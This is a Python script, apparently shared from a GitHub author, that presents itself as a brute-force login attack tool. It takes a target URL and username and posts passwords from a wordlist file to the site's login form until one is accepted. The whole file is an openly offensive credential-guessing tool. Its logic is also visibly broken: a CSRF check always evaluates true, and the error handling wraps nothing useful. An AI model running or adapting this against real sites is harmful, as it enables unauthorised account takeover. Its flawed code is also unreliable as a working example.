######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7                                                                  #
######################################################################################################

print (""" 

8888888b.   .d8888b.  8888888b.              d8888 88888888888 88888888888     d8888  .d8888b.  888    d8P
888   Y88b d88P  Y88b 888   Y88b            d88888     888         888        d88888 d88P  Y88b 888   d8P
888    888 888    888 888    888           d88P888     888         888       d88P888 888    888 888  d8P
888   d88P 888        888   d88P          d88P 888     888         888      d88P 888 888        888d88K
8888888P"  888  88888 8888888P"          d88P  888     888         888     d88P  888 888        8888888b
888        888    888 888 T88b          d88P   888     888         888    d88P   888 888    888 888  Y88b
888        Y88b  d88P 888  T88b        d8888888888     888         888   d8888888888 Y88b  d88P 888   Y88b
888         "Y8888P88 888   T88b      d88P     888     888         888  d88P     888  "Y8888P"  888    Y88b
               

""")

z = """ 
        [+]█████████████████████████████████████████████████████████████████████████████[+]



"""


import requests
import time
import sys
import signal
 
url = input("\033[1;33m URL: ")
username = input("\033[1;36m Conta do burlador: ")
error = input("\033[1;34m Nº Disparos:")

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("\033[1;32m"+"[*]"+"\033[0m"+"  Iniciando Attack: "+ str(count) + ' \033[1;95m ==> ' + password)
            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Attack ---> " + username)
                print("Attack ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("email.txt", "r") as passwords:
    bruteCracking(username,url,error)

print("[!!] password not in list")
